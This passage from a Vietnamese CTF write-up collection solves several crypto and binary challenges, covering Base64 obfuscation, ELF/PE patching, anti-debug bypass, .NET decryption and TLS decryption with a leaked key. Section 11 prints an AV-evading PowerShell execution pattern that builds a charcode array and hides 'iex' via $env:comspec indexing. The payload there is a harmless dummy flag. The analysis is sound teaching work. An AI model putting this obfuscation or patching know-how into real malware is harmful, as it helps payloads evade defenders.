full = bs.decode('utf-8')                                   # chuỗi fullwidth
b64 = unicodedata.normalize('NFKC', full)                  # -> VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==
print(base64.b64decode(b64).decode())                      # -> Th3_Emb3zzl3r_15_Fumie
```
Chạy thật cho đúng kết quả trên.

**(f) Flag & ý nghĩa.** `flag{Th3_Emb3zzl3r_15_Fumie}` — danh tính kẻ biển thủ. Bài dạy: fullwidth Unicode là
một "lớp ngụy trang" phổ biến cho Base64.

**(g) Cạm bẫy & cách khác.** (1) Nếu copy chuỗi fullwidth vào bộ decode Base64 *không* normalize trước → báo
lỗi ký tự lạ. CyberChef có bước "Normalize Unicode (NFKC)" trước "From Base64". (2) Đừng nhầm `EF BB BF` (BOM)
với fullwidth.

**(h) Tham khảo.** Unicode Normalization NFKC; dải Halfwidth/Fullwidth Forms (U+FF00–FFEF); UTF-8 encoding.

## 11. ShellScript (Crypto - 200)

**(a) Đề bài & metadata.** Crypto, 200đ. File: `ShellScript (Crypto - 200)/README.md` chứa một blob Base64
rất dài. Tên bài gợi "fileless malware dùng shell script".

**(b) Kiến thức nền.** Đây là mô phỏng **fileless malware** kiểu PowerShell: payload được bọc nhiều lớp để né
antivirus. Các lớp thường gặp: (1) **Base64** (PowerShell hay dùng `-EncodedCommand`); (2) **mảng mã ký tự**
`([char]104,105...)` rồi `-Join` thành lệnh; (3) gọi gián tiếp `cmd`/`iex` bằng chỉ số ký tự của biến môi
trường để giấu từ khóa. Thủ thuật `&($env:comspec[4,15,25] -Join '')` lấy ký tự số 4,15,25 của `comspec`
(=`C:\Windows\system32\cmd.exe`) → ghép ra `iex` (Invoke-Expression) mà không viết thẳng chữ "iex".

**(c) Trinh sát.** Base64-decode lớp ngoài:
```
(((102,117,110,99,116,105,111,110,32,83,104,111,119,...,125) | %{ ([Int]$_ -as [char]) }) -Join '') | &($env:comspec[4,15,25] -Join '')
```
Thấy ngay cấu trúc: một **danh sách số** → map sang ký tự (`[char]`) → nối chuỗi → thực thi bằng `iex` ẩn.

**(d) Phân tích & reasoning.** Thay vì *thực thi* (nguy hiểm), ta chỉ **giải tĩnh**: đổi danh sách số thập phân
→ ASCII → ra đoạn PowerShell thật. Nó định nghĩa hàm `ShowDummyFlag($flag)` (tính MD5 phần trong `{}` để in
"dummy flag" cho vui) và **gọi** `ShowDummyFlag("flag{Fileless_Malware_Often_Uses_ShellScript}")`. Flag thật
nằm ngay trong **tham số truyền vào** — không cần chạy hàm.

**(e) Lời giải (giải tĩnh, KHÔNG chạy PowerShell).**
```python
import base64
blob = "KCgoMTAyLDExNy4..."                       # blob Base64 trong README
layer1 = base64.b64decode(blob).decode()           # ra '(((102,117,...) | %{[char]$_}) -Join '') | &(...)'
import re
nums = re.search(r'\(\(\((.*?)\)\s*\|', layer1).group(1)   # lấy danh sách số
script = ''.join(chr(int(n)) for n in nums.split(','))      # đổi số -> ký tự
print(script)
# -> function ShowDummyFlag($flag){...}; ShowDummyFlag("flag{Fileless_Malware_Often_Uses_ShellScript}");
```
Đọc chuỗi ra là thấy flag trong lời gọi `ShowDummyFlag(...)`.

**(f) Flag & ý nghĩa.** `flag{Fileless_Malware_Often_Uses_ShellScript}` — đúng chủ đề: malware fileless hay
dùng shell script nhiều lớp mã hóa.

**(g) Cạm bẫy & cách khác.** (1) **Tuyệt đối không** chạy đoạn PowerShell để "xem output" — dù bài này lành,
đây là thói quen nguy hiểm với mẫu malware. Luôn giải tĩnh (đổi số→char). (2) `ShowDummyFlag` tính MD5 nên nếu
chạy sẽ in `flag{<md5>}` (dummy) — dễ tưởng nhầm là flag; flag thật là chuỗi gốc truyền vào. (3) CyberChef:
"From Base64" → "From Charcode" (delimiter = comma).

**(h) Tham khảo.** Kỹ thuật obfuscation PowerShell (`-EncodedCommand`, charcode, `comspec` indexing); khái niệm
fileless malware.


---

## 12. Binary_Ultra-Introduction (Binary - 50)

⚠️ **Repo không có lời giải sẵn** (`README.md` rỗng). File đề:
`Binary_Ultra-Introduction (Binary - 50)/Binary_Ultra-Introduction_bdb5baaf4b4f961738e1d1528f2efd35.zip`
(6908 bytes; git blob sha1 `48746993f143bed2cfd5311da83f05df7867679d`). ⚠️ md5 thật của zip =
`0e22e8be56bb87af3be9a21c04ac4f59`, **khác** hash trong tên (`bdb5baaf...`).

**Phân tích tĩnh (suy luận):** đây là bài Binary nhập môn 50đ ("ultra introduction"). Hướng chuẩn:
`unzip` → `file` xác định loại (thường ELF/PE rất nhỏ) → `strings -a` tìm flag/chuỗi gợi ý → nếu cần
disassemble bằng `objdump -d`/Ghidra tìm so sánh chuỗi nhập với chuỗi cứng. Bài 50đ thường flag lộ ngay qua
`strings` hoặc một phép so sánh đơn giản. Không có file giải nên không khẳng định flag.

## 13. sleepy (Binary - 100)

> **PASS 3 — đã disassemble tĩnh file thật** (`objdump -d -M intel`, `readelf`, `nm`) và **tự giải mã bằng
> Python**; mọi giá trị dưới đây trích trực tiếp từ binary `sleep` (md5 `d85883e7aa9057a7be6f2d6baadeefd0`).

**(a) Đề bài & metadata.** Binary, 100đ. File đề: `sleepy (Binary - 100)/sleep` (8880 bytes; md5
`d85883e7aa9057a7be6f2d6baadeefd0`; sha1 `c608591d124355a57c7c0ba2c93f280b944a58b0`). Bản patch tham khảo:
`sleep-patched` (md5 `80f66c3645cf9725db7ab4a01de03072`). Phân tích tĩnh cho biết:
`ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, GNU/Linux
2.6.32, BuildID f3aa54ff..., not stripped`. Entry point `0x4004c0`, biên bằng GCC 5.4.0 (Ubuntu 16.04). "Not
stripped" = còn bảng ký hiệu → `nm` đọc được tên hàm.

**(b) Kiến thức nền.**
- **ELF (Executable and Linkable Format):** định dạng file thực thi/thư viện của Linux. Header bắt đầu bằng magic
  `7F 45 4C 46` (`\x7fELF`). `readelf -h` in các trường: Class (ELF64), Entry point, số section... Vùng mã nằm ở
  section `.text`, dữ liệu khởi tạo ở `.data`, dữ liệu rỗng ở `.bss` (không chiếm chỗ trên đĩa).
- **Hàm thư viện `sleep(unsigned int seconds)`** (glibc): tạm dừng tiến trình số *giây* truyền vào. Tham số là
  **unsigned int 32-bit** → tối đa ~4,29 tỷ giây (~136 năm).
- **Immediate value:** hằng số nhúng thẳng trong lệnh máy (ví dụ `mov DWORD PTR [rbp-0x4], 0x9af8da00`). Patch =
  tìm đúng các byte immediate này trong file rồi sửa.
- **System V AMD64 calling convention:** tham số nguyên thứ nhất truyền qua thanh ghi **`edi`/`rdi`**. Nên muốn
  biết `sleep()` ngủ bao lâu, ta đọc giá trị nạp vào `edi` ngay trước `call sleep`.
- **Cumulative XOR decode:** kỹ thuật giấu chuỗi: lưu một mảng hằng, rồi XOR dồn (`a[i+1] ^= a[i]`) để sinh ra
  ký tự thật lúc chạy → `strings` **không** thấy flag (đây chính là lý do bài này cần reverse, không chỉ `strings`).

**(c) Trinh sát (lệnh thật đã chạy).**
```
$ file sleep        # ELF 64-bit ... not stripped
$ strings -a sleep  # chỉ thấy: "I'm so sleepy...", "sleep", "sleep.c"  (KHÔNG có flag!)
$ nm sleep | grep ' T \| t '
  0000000000400614 T main
  00000000004005b6 T xor          <-- có hàm tên 'xor' đáng ngờ
  ...                 U sleep@@GLIBC_2.2.5
```
Việc `strings` không có flag + có hàm `xor` ⇒ flag được **sinh runtime** bằng XOR, không nằm sẵn trong file.

**(d) Phân tích & reasoning (disassembly thật của `main`).**
```asm
0000000000400614 <main>:
  40061c: c7 45 fc 00 da f8 9a   mov DWORD PTR [rbp-0x4], 0x9af8da00   ; delay = 0x9AF8DA00
  401623: bf d4 06 40 00         mov edi, 0x4006d4                     ; "I'm so sleepy..."
  401628: e8 .. call 400480 <puts@plt>                                ; puts(...)
  40062d: 8b 45 fc               mov eax, [rbp-0x4]
  400630: 89 c7                  mov edi, eax                          ; edi = 0x9AF8DA00 (giây)
  400632: e8 .. call 4004a0 <sleep@plt>                               ; sleep(0x9AF8DA00)
  40063c: e8 .. call 4005b6 <xor>                                     ; xor()  -> in flag
```
⚠️ **ĐÍNH CHÍNH quan trọng:** writeup gốc ghi hằng delay là `0x2600000000` — **sai ký hiệu**. Giá trị thật
trong lệnh là **`0x9AF8DA00`**, và `0x9AF8DA00 = 2.600.000.000` (thập phân). Tác giả writeup đã viết nhầm *số
thập phân 2600000000* thành *"0x2600000000"* (nếu đọc như hex thì `0x2600000000` ≈ 163 tỷ, không vừa `unsigned
int` 32-bit mà `sleep` nhận). Delay thật ≈ 2,6 tỷ giây (~82 năm) → coi như treo vĩnh viễn.

Disassembly hàm `xor` (vòng lặp từ i=0 đến i=0x16 = 22):
```asm
00000000004005b6 <xor>:
  4005be: mov DWORD PTR [rbp-0x4], 0x0        ; i = 0
loop (4005c7):
  mov edx, [rax*4 + 0x601060]                 ; edx = arr[i]
  mov eax, [ (i+1)*4 + 0x601060]              ; eax = arr[i+1]
  xor edx, eax                                ; edx = arr[i] ^ arr[i+1]
  mov [ (i+1)*4 + 0x601060], edx              ; arr[i+1] = arr[i] ^ arr[i+1]   (XOR dồn)
  mov eax, [ i*4 + 0x601060]                  ; eax = arr[i]
  call putchar                                ; putchar(arr[i])
  add DWORD PTR [rbp-0x4], 1                  ; i++
  cmp DWORD PTR [rbp-0x4], 0x16 ; jle loop    ; lặp khi i <= 22  (23 vòng)
```
Mảng `arr` nằm ở `.data` vaddr `0x601060`. Dùng `objdump -s -j .data` trích được (dword little-endian, chỉ byte
thấp có nghĩa):
```
0x601060: 46 2a 0d 06 47 49 1a 53 53 42 02 00 43 41 5f 09 38 39 56 42 41 40 07   (23 giá trị)
```
Thuật toán: mỗi vòng cập nhật `arr[i+1] = arr[i] ^ arr[i+1]` (XOR tiền tố dồn) rồi `putchar(arr[i])`.

**(e) Lời giải — hai hướng.**

*Hướng A (giải mã tĩnh, không chạy binary — PASS 3 đã dùng để kiểm chứng):* mô phỏng chính xác hàm `xor` bằng
Python trên mảng vừa trích:
```python
arr=[0x46,0x2a,0x0d,0x06,0x47,0x49,0x1a,0x53,0x53,0x42,0x02,0x00,
     0x43,0x41,0x5f,0x09,0x38,0x39,0x56,0x42,0x41,0x40,0x07] + [0]  # arr[23] thuộc .bss = 0
out=[]; i=0
while i<=0x16:                 # cmp i,0x16 ; jle  -> i = 0..22
    arr[i+1]=arr[i]^arr[i+1]   # arr[i+1] = arr[i] ^ arr[i+1]
    out.append(arr[i])         # putchar(arr[i])
    i+=1
print(''.join(map(chr,out)))   # -> "Flag is s133p1ng_f0r3st"   (23 ký tự)
```
Kết quả chạy thật: `Flag is s133p1ng_f0r3st`. (Chú ý: `putchar(arr[i])` in `arr[i]` *đã được cập nhật ở vòng
trước*, nên chuỗi in ra là dãy XOR-tiền-tố — chữ đầu `arr[0]=0x46='F'`.)

*Hướng B (patch delay — như writeup):* tìm 4 byte immediate `00 DA F8 9A` (little-endian của `0x9AF8DA00`) trong
file và sửa thành `00 00 00 00`:
```
# trong IDA: tới lệnh 'mov [rbp-4], 0x9AF8DA00' -> Edit > Patch bytes -> 0 -> Apply patches to input file
# hoặc radare2:
r2 -w ./sleep ; > /x 00daf89a ; > wx 00000000 @ <offset> ; > q
# chạy bản vá trong VM cách ly -> in ngay: "I'm so sleepy..." / "Flag is s133p1ng_f0r3st"
```
(Ảnh `sleep-patched.png` trong repo khớp output trên.)

**(f) Flag & ý nghĩa.** `flag{s133p1ng_f0r3st}` ("sleeping forest"). Output in `Flag is s133p1ng_f0r3st`; theo
định dạng, flag nộp là `flag{s133p1ng_f0r3st}`.

**(g) Cạm bẫy & cách khác.** (1) ⚠️ delay thật là `0x9AF8DA00` chứ không phải "0x2600000000" như writeup. (2)
`strings` vô dụng ở bài này — flag sinh runtime bằng XOR dồn, phải reverse `xor()`. (3) Thay vì patch, có thể hook
`sleep`/`nanosleep` bằng `LD_PRELOAD` trả về ngay, hoặc dùng gdb nhảy qua lời gọi `sleep`. (4) Cẩn thận
little-endian khi tìm byte immediate. (5) `arr[23]` thuộc `.bss` = 0, không ảnh hưởng vì vòng lặp chỉ `putchar`
đến `arr[22]`.

**(h) Tham khảo.** `man sleep(3)`; ELF format; System V AMD64 ABI (tham số qua `rdi`); IDA "Patch bytes"; radare2
`wx`; `LD_PRELOAD` hooking.

## 14. present (Binary - 100)

> **PASS 3 — đã disassemble tĩnh** `present-unpack.exe` (`objdump -d -M intel`, `pefile`) và **so sánh byte** với
> `present-patched.exe` (`cmp -l`). Mọi offset/opcode dưới đây trích trực tiếp từ file thật.

**(a) Đề bài & metadata.** Binary, 100đ. File: `present (Binary - 100)/present.zip` (17375 bytes; md5
`1ad90fb03793391a6c1f05c2e8c246db`) chứa `present.exe` (bản UPX). Repo kèm `present-unpack.exe` (đã gỡ UPX; md5
`432a864ed1b5f0afe7567d0072511480`) và `present-patched.exe` (đã patch; md5 `b22705c0e277d66103bb9c661d427b7d`).
Phân tích tĩnh: `PE32 executable (console) Intel i386, 14 sections`; EntryPoint `0x12d0`, ImageBase `0x400000`.
Chạy `present.exe` chỉ in `Oops...`.

**(b) Kiến thức nền.**
- **PE (Portable Executable):** định dạng .exe/.dll của Windows. Bắt đầu bằng `MZ` (DOS stub) rồi `PE\0\0` + COFF
  header + Optional header (ImageBase, AddressOfEntryPoint) + bảng section (`.text` mã, `.rdata` hằng/chuỗi,
  `.idata` import...). **Import Address Table (IAT)** liệt kê hàm từ DLL ngoài — `pefile` đọc được.
- **UPX:** trình nén exe. File packed chỉ chứa *stub* tự giải nén vào bộ nhớ lúc chạy → đọc tĩnh thấy toàn dữ liệu
  nén. Gỡ bằng `upx -d` để lộ mã gốc. Dấu hiệu: section tên `UPX0/UPX1`, entropy cao, PEiD/DIE báo "UPX".
- **Anti-debug `IsDebuggerPresent()`** (KERNEL32): trả về `!= 0` nếu tiến trình đang bị debug. Malware/CTF dùng nó
  để đổi hành vi khi phát hiện debugger.
- **Lệnh nhảy có điều kiện x86:** `test eax,eax` đặt cờ ZF=1 nếu eax==0. `je/jz` (opcode **`74`**) nhảy khi ZF=1;
  `jne/jnz` (opcode **`75`**) nhảy khi ZF=0. Đảo 1 byte `74↔75` = **đảo điều kiện** → đổi luồng. Đây là patch kinh
  điển.
- **System V/stack string:** trình biên dịch có thể dựng chuỗi ngay trên **stack** bằng loạt `mov DWORD PTR
  [esp+off], <4 ký tự>` thay vì để trong `.rdata` → `strings` **vẫn** có thể thấy (vì là ASCII), nhưng thứ tự rải
  rác; đọc disassembly mới ghép đúng.

**(c) Trinh sát (lệnh thật).**
```
$ file present.exe            # (bản gốc) PE32, packed -> PEiD/DIE báo UPX
$ upx -d present.exe -o present-unpack.exe
$ strings -a present-unpack.exe | grep -iE "oops|debug|flag"
  Oops...
  Debugger
  IsDebuggerPresent
  _flag                        <-- có symbol _flag (file còn debug info)
$ python -c "import pefile; pe=pefile.PE('present-unpack.exe'); [print(i.name) for e in pe.DIRECTORY_ENTRY_IMPORT for i in e.imports if i.name and b'Debug' in i.name]"
  b'IsDebuggerPresent'
```

**(d) Phân tích & reasoning (disassembly thật của `_main`).**
```asm
00401410 <_main>:
  40141f: mov BYTE  [esp+0x5f], 0x1          ; cờ nội bộ = 1
  401424: mov DWORD [esp+0x14], 0x68786d5a   ; dựng chuỗi trên stack: "Zmxh"
  40142c: mov DWORD [esp+0x18], 0x5574335a   ;   "Z3tU"
  ...                                         ;   (13 dword liên tiếp -> chuỗi Base64)
  401484: mov DWORD [esp+0x44], 0x3d3d5166   ;   "fQ=="
  4014c4: call <_IsDebuggerPresent@0>        ; eax = có debugger?
  4014c9: test eax, eax
  4014cb: jne  4014f5                         ; nếu CÓ debugger -> in "Debugger" (0x40504c)
  4014cd: movzx eax, BYTE [esp+0x5f]          ; eax = 1
  4014d2: xor  eax, 0x1                        ; eax = 1 ^ 1 = 0
  4014d5: test al, al
  4014d7: je   4014e7         ; <== 74 0e      ; vì al==0 -> NHẢY tới in "Oops..." (0x405044)
  4014d9: lea  eax, [esp+0x14]                 ; (nhánh KHÔNG nhảy) -> puts(chuỗi Base64 = FLAG)
  4014e0: call <_puts>
  4014e7: mov  DWORD [esp], 0x405044 ; call _printf   ; "Oops..."
  4014f5: mov  DWORD [esp], 0x40504c ; call _printf   ; "Debugger"
```
Chuỗi tại `0x405044` = `"Oops..."`, tại `0x40504c` = `"Debugger"` (xác nhận bằng `objdump -s -j .rdata`). Logic:
- Không debugger + cờ=1 → `1^1=0` → `je` nhảy → in **"Oops..."** (đường chạy bình thường).
- Có debugger → in **"Debugger"**.
- Muốn tới `puts(chuỗi Base64)` (= in flag) thì phải để `je` **không** nhảy → cần `al != 0`. Đổi `je`(**74**) thành
  `jne`(**75**) là xong — đúng mô tả "đổi jz→jnz" của writeup.

*Hướng sai đã loại:* ban đầu tưởng phải "đánh lừa IsDebuggerPresent" (patch nhánh `jne 4014f5`). Nhưng nhánh đó chỉ
rẽ sang "Debugger"; nhánh quyết định in flag là `je 4014d7`. Patch đúng chỗ là `je`→`jne`.

**(e) Lời giải — gồm (1) giải tĩnh flag, (2) xác nhận patch.**

*(1) Giải mã chuỗi stack (không cần chạy):* 13 dword little-endian ghép lại rồi Base64-decode:
```python
import struct, base64
dw=[0x68786d5a,0x5574335a,0x554e5652,0x42563058,0x666c3155,0x664e5653,0x43564552,
    0x48645556,0x664a5652,0x464a4655,0x4f563055,0x68454356,0x3d3d5166]
b=b''.join(struct.pack('<I',d) for d in dw)
print(b.decode())                       # ZmxhZ3tURVNUX0VBU1lfSVNfREVCVUdHRVJfUFJFU0VOVCEhfQ==
print(base64.b64decode(b).decode())     # flag{TEST_EASY_IS_DEBUGGER_PRESENT!!}
```

*(2) Xác nhận patch bằng cmp (PASS 3 đã chạy):*
```
$ cmp -l present-unpack.exe present-patched.exe
  2264 164 165        # chỉ 1 byte khác! (giá trị OCTAL): 0o164=0x74 (je) -> 0o165=0x75 (jne)
```
Đúng 1 byte đổi từ `0x74`→`0x75` tại file-offset 2263 (0-based) — chính là lệnh `je 4014e7`. Chạy bản patched in
ra chuỗi Base64 ở trên → decode ra flag.

**(f) Flag & ý nghĩa.** `flag{TEST_EASY_IS_DEBUGGER_PRESENT!!}` — chơi chữ "present" (món quà /
IsDebugger**Present**): bài dạy nhận diện & vô hiệu anti-debug.

**(g) Cạm bẫy & cách khác.** (1) Phải gỡ UPX trước mới đọc được mã gốc. (2) Patch sai lệnh (nhầm `jne 4014f5`)
sẽ không in flag — phải patch `je 4014d7`. (3) Cách khác không patch: chạy trong debugger và sửa cờ ZF (hoặc giá
trị `[esp+0x5f]`) tại runtime; hoặc đọc tĩnh chuỗi stack như (1) (nhanh nhất, không cần chạy). (4) Dù bài lành,
chỉ chạy exe trong VM cách ly.

**(h) Tham khảo.** `upx -d`; opcode x86 `74=je/jz`, `75=jne/jnz`; WinAPI `IsDebuggerPresent`; PE format; `pefile`.

## 15. dotnet_branch (Binary - 120)

> **PASS 3 — không có .NET decompiler trong môi trường** (chỉ `objdump/readelf/nm/pefile/strings`). Tuy vậy đã
> **trích tĩnh được khóa AES, IV và cả 2 ciphertext** từ các UTF-16 string của assembly, và thử giải mã bằng
> Python để kiểm chứng giả thuyết.

**(a) Đề bài & metadata.** Binary, 120đ. File: `dotnet_branch (Binary - 120)/dotnet_branch_fee.exe` (10752
bytes; md5 `fee201a96c8e30d09141f7493457f1b6` — khớp tiền tố "fee" trong tên). Phân tích tĩnh (`pefile`):
`PE32, Mono/.Net assembly, 3 sections (.text/.rsrc/.reloc)`, Data Directory #14 (CLR Runtime Header) RVA
`0x2008` size 72 ⇒ đúng là **.NET assembly**. Chạy file in ra Base64 → decode ra **fake flag**
`flag{th1s_1s_dummy_f14g}`.

**(b) Kiến thức nền.**
- **Cấu trúc file .NET:** là PE bình thường nhưng phần mã là **CIL/MSIL** (bytecode máy ảo CLR), không phải x86.
  Có **CLR header** (Data Directory #14 "COM Descriptor") trỏ tới **metadata** gồm các stream: `#~` (bảng
  metadata: TypeDef, MethodDef...), `#Strings` (tên định danh), `#US` (**User Strings** — literal chuỗi UTF-16 của
  chương trình), `#Blob`, `#GUID`. Vì metadata giàu thông tin, công cụ như **dnSpy/ILSpy/dotPeek** decompile ra
  **gần như mã nguồn C#**.
- **Vì sao `objdump -d` vô dụng:** nó disassemble x86, trong khi thân hàm .NET là IL → phải dùng công cụ IL. Ở môi
  trường này không có, nên ta khai thác điểm yếu khác: **literal chuỗi** của .NET nằm ở stream `#US` dưới dạng
  **UTF-16LE** → `strings -e l` (little-endian 16-bit) đọc ra.
- **Mã hóa đối xứng trong .NET:** lớp `System.Security.Cryptography` (RijndaelManaged/AesManaged, DESCrypto...).
  Mẫu điển hình: `Convert.FromBase64String(ciphertext)` → `CreateDecryptor(key, iv)` → `TransformFinalBlock`. Khóa
  thường sinh từ chuỗi mật khẩu qua KDF (`Rfc2898DeriveBytes`=PBKDF2, hay `PasswordDeriveBytes`), hoặc dùng thẳng
  bytes của chuỗi.
- **"branch":** có một nhánh `if (bool) {...}` chọn giữa giải mã *dummy* và *flag thật*.

**(c) Trinh sát (lệnh thật).**
```
$ strings -a dotnet_branch_fee.exe | grep -iE "Base64|Decrypt|Create|Resource|Main"
  FromBase64String
  CreateDecryptor           <-- có dùng mã hóa đối xứng
  Decrypt
  Convert
  dotnet_branch.Resources.resources
$ strings -a -e l dotnet_branch_fee.exe        # UTF-16 literals (#US stream)
  AbCdEfGhIjKlMnOp          <-- 16 ký tự = khóa AES-128
  ZyXwVuTsRqPoNmLk          <-- 16 ký tự = IV
  Gd+wc29NWcMJG80rPMC9...==  (112 byte sau base64 — ciphertext #1)
  PVFbnnToZ4UfJMPmOqs+...=   ( 80 byte sau base64 — ciphertext #2)
```

**(d) Phân tích & reasoning.** Các method `FromBase64String` + `CreateDecryptor` + `Decrypt` + 2 ciphertext + 1
cặp `key/iv` 16-byte ⇒ chương trình **giải mã AES-128** một trong hai ciphertext tùy nhánh bool; nhánh `false`
(mặc định) in dummy, `true` in flag thật. Giả thuyết trực tiếp: `key="AbCdEfGhIjKlMnOp"`, `iv="ZyXwVuTsRqPoNmLk"`,
mode CBC.

*Hướng sai đã loại (PASS 3 thử thật):* giải AES-128-CBC với key/iv là **bytes ASCII thô** của 2 chuỗi trên:
```python
from Crypto.Cipher import AES; import base64
key=b"AbCdEfGhIjKlMnOp"; iv=b"ZyXwVuTsRqPoNmLk"
AES.new(key,AES.MODE_CBC,iv).decrypt(base64.b64decode("Gd+wc29NWcMJG80r...=="))
# -> ra bytes rác (\x98\xf4\xa0... ), KHÔNG phải flag
```
⇒ key **không** dùng trực tiếp; .NET hầu như chắc đã bọc qua một **KDF** (vd `Rfc2898DeriveBytes`/`PasswordDerive
Bytes` với salt+iteration) hoặc hash (MD5/SHA) trước khi làm khóa AES. Kích thước ciphertext (112 và 80 byte) cũng
gợi plaintext dài hơn flag thuần → có thể plaintext *chính nó lại là Base64* (chương trình in ra Base64). Không có
decompiler để đọc KDF/salt nên **không khôi phục được khóa dẫn xuất offline** → đây đúng là lý do con đường chuẩn
là **debug runtime** (dnSpy), không phải giải mã tay.

**(e) Lời giải — con đường chuẩn (dnSpy) + kiểm chứng flag.**
```
1) Mở dotnet_branch_fee.exe trong dnSpy (có .NET decompiler + debugger).
2) Decompile: thấy if(<bool>) { Decrypt(ciphertext_thật) } else { Decrypt(ciphertext_dummy) }.
3) Đặt breakpoint tại Entry Point / ngay trước if; Start debug.
4) Khi dừng, sửa biến bool đó = true (cửa sổ Locals), hoặc đảo IL brfalse<->brtrue.
5) Tiếp tục -> in Base64 flag thật: ZmxhZ3tkb3ROM1RfcHIwZ3I0bV9kZTZ1Z2cxbmdfMXNfZTRzeX0=
```
Decode (đã kiểm chứng Python):
```python
import base64
print(base64.b64decode("ZmxhZ3tkb3ROM1RfcHIwZ3I0bV9kZTZ1Z2cxbmdfMXNfZTRzeX0=").decode())
# -> flag{dotN3T_pr0gr4m_de6ugg1ng_1s_e4sy}
```
(Giá trị đã trích tĩnh để tham khảo/kiểm thử lại khi có dnSpy: key=`AbCdEfGhIjKlMnOp`, iv=`ZyXwVuTsRqPoNmLk`,
ct_dài=`Gd+wc29NWcMJG80rPMC9y9Cu8kMFTEXoeyTShHaro0FSqKAN/Ts3po166uF3N0MgNWlz1/qaQfQNM7pyO8T45+ZVf7eAcwSOhFs9bdCqTsZyX1dfuAmX0PpCEC/T3JJWdU7vFepUFHNPMgFISR1UBw==`,
ct_ngắn=`PVFbnnToZ4UfJMPmOqs+fUrLRilmKQcSs4JhATd8yfaGjffjDQOT8Eem+zuGRelxlm5XJiNWJIUPhe3Iar9MPqFxt2hVe0v7eXj4mao5y6Y=`.)

**(f) Flag & ý nghĩa.** `flag{dotN3T_pr0gr4m_de6ugg1ng_1s_e4sy}` — "debug chương trình .NET rất dễ".
⚠️ **Đính chính:** README gốc viết nhầm `cflag{dotN3T_...}` (thừa chữ "c"). Flag đúng bắt đầu `flag{`.

**(g) Cạm bẫy & cách khác.** (1) Đừng nộp fake flag `flag{th1s_1s_dummy_f14g}`. (2) Giải mã offline chỉ được nếu
biết **đúng KDF + salt + mode** — ở đây không có decompiler nên không suy ra; dnSpy runtime là nhanh nhất. (3)
Thay vì sửa biến, có thể sửa IL: `ldc.i4.0`→`ldc.i4.1`, hoặc đổi `brfalse`↔`brtrue`, rồi lưu lại bằng dnSpy. (4)
Luôn chạy .NET lạ trong VM.

**(h) Tham khảo.** Cấu trúc .NET metadata (`#~`,`#Strings`,`#US`); dnSpy/ILSpy; `System.Security.Cryptography`
(RijndaelManaged, Rfc2898DeriveBytes); IL `brtrue/brfalse`; `strings -e l`.

## 16. Unlock (Binary - 150)

> **PASS 3 — không có binary để disassemble:** challenge này không phải file thực thi mà là **pcap + private key**
> (bài network/TLS dán nhãn "Binary"). File đề là ZIP **1,8 MB** → theo chỉ đạo *bỏ qua file lớn* để tránh nghẽn
> mạng; phần dưới đào sâu bằng **kiến thức nền TLS + quy trình** đầy đủ (không có disassembly cho bài này).

**(a) Đề bài & metadata.** Dán nhãn Binary, 150đ (bản chất Network/TLS forensics). File:
`Unlock (Binary - 150)/64ef3b043d56cbbb8f873cfa96cd3e4e.zip` (1870603 bytes; git blob sha1
`711ca6edb450fa772e2ff2970aeefbe39d189383`; md5 nhúng tên `64ef3b043d56cbbb8f873cfa96cd3e4e`). Trong zip:
`unlock.pcapng` (bản ghi gói tin) và `server.key` (khóa riêng RSA của server).

**(b) Kiến thức nền (TLS từ gốc).**
- **TLS/HTTPS** bảo vệ dữ liệu bằng mã hóa **đối xứng** (AES...) với một *khóa phiên*. Vấn đề: hai bên phải **thống
  nhất khóa phiên** an toàn qua kênh công khai → nhiệm vụ của **handshake**.
- **Handshake TLS 1.2 (phiên RSA key exchange):**
  1. **ClientHello** — client gửi `client_random` + danh sách cipher suite.
  2. **ServerHello** — server chọn cipher suite, gửi `server_random`.
  3. **Certificate** — server gửi chứng chỉ chứa **public key RSA**.
  4. **ClientKeyExchange** — client sinh **pre-master secret** (48 byte), **mã hóa bằng public key** server rồi
     gửi. Chỉ ai có **private key** mới giải ra pre-master.
  5. Hai bên dẫn xuất **master secret** = PRF(pre-master, "master secret", client_random+server_random), từ đó sinh
     khóa đối xứng + MAC. **ChangeCipherSpec/Finished** → bắt đầu mã hóa.
- **Mấu chốt bài này:** với **RSA kx**, mọi bí mật phiên phái sinh từ pre-master, mà pre-master được mã hóa bằng
  public key. Có **private key** (`server.key`) ⇒ giải ngược pre-master ⇒ tính master secret ⇒ **giải mã mọi gói**.
  Wireshark tự động hóa khi ta nạp `server.key`.
- **Vì sao đôi khi KHÔNG giải được — Forward Secrecy:** nếu handshake dùng **(EC)DHE** (Diffie–Hellman tạm thời),
  khóa phiên dựa trên số bí mật *tạm thời*, **không** mã hóa bằng RSA key → có private key cũng vô dụng ("Perfect
  Forward Secrecy"); khi đó chỉ giải được nếu có **SSLKEYLOGFILE**. Việc đề **cho server.key** là dấu hiệu phiên
  dùng **RSA kx** (cipher suite kiểu `TLS_RSA_WITH_AES_...`).
- **PEM key:** `server.key` thường là PEM `-----BEGIN RSA PRIVATE KEY-----` (base64 DER). `openssl rsa -in
  server.key -text -noout` xem tham số.

**(c) Trinh sát.**
```
unzip 64ef3b043d56cbbb8f873cfa96cd3e4e.zip
tree .                       # server.key (PEM RSA private) + unlock.pcapng
openssl rsa -in server.key -noout -text | head   # xác nhận RSA key hợp lệ
```
Mở `unlock.pcapng` bằng Wireshark: có GET đọc `flag.txt` qua **HTTP (cổng 80)**, nhưng server trả **301/302
redirect sang HTTPS** → request thật bị mã hóa TLS.

**(d) Phân tích & reasoning.** Có `server.key` + traffic chuyển HTTPS ⇒ mục tiêu là **giải mã TLS bằng private
key**. Kiểm tra cipher suite trong ServerHello: `TLS_RSA_WITH_*` → nạp key giải được; `*_ECDHE_*`/`*_DHE_*` → không
giải được (bài giải được ⇒ chắc chắn RSA kx).

**(e) Lời giải.**
```
Wireshark: Edit > Preferences > Protocols > TLS > RSA keys list (ban moi: "Decryption"):
   IP Address = <IP server> , Port = 443 , Protocol = http , Key File = server.key
Apply -> cac goi Application Data TLS duoc giai ma.
Chuot phai mot goi cua phien -> Follow > TLS Stream (hoac HTTP Stream)
   -> doc phan hoi GET /flag.txt -> thay flag.
```
Hoặc dòng lệnh:
```
tshark -r unlock.pcapng -o "tls.keys_list:<ip>,443,http,server.key" -Y "http" -O http
```

**(f) Flag & ý nghĩa.** `flag{cf8236571e9dd3bcaf44b188bba4f15d}` — "unlock" = *mở khóa* phiên TLS nhờ private key.
Bài học: RSA key exchange (không forward secrecy) + lộ private key = toàn bộ traffic bị giải mã.

